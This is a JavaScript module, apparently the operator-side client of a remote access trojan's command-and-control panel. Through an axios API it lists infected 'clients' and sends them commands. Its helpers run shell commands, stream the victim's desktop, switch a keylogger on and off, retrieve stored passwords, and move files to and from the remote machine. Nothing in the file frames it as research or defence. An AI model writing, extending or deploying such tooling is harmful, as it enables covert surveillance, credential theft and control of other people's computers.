
import axios from 'axios';

const API_URL = process.env.NODE_ENV === 'production' 
  ? '/api' 
  : 'http://localhost:3001/api';

const remoteService = {
  // Client management
  getAllClients: async () => {
    const response = await axios.get(`${API_URL}/clients`);
    return response.data;
  },
  
  // Command execution
  sendCommand: async (clientId, type, payload = '') => {
    const response = await axios.post(`${API_URL}/clients/${clientId}/commands`, {
      type,
      payload
    });
    return response.data;
  },
  
  // Command specific helpers
  executeShellCommand: (clientId, command) => {
    return remoteService.sendCommand(clientId, 'execute', command);
  },
  
  toggleDesktopStream: (clientId, enable) => {
    return remoteService.sendCommand(clientId, 'toggle_desktop_stream', enable ? 'true' : 'false');
  },
  
  toggleKeylogger: (clientId, enable) => {
    return remoteService.sendCommand(clientId, 'toggle_keylogger', enable ? 'true' : 'false');
  },
  
  retrievePasswords: (clientId) => {
    return remoteService.sendCommand(clientId, 'retrieve_passwords');
  },
  
  downloadFile: (clientId, remotePath) => {
    return remoteService.sendCommand(clientId, 'download_file', remotePath);
  },
  
  uploadFile: (clientId, localPath, remotePath) => {
    return remoteService.sendCommand(clientId, 'upload_file', `${localPath}|${remotePath}`);
  }
};

export default remoteService;
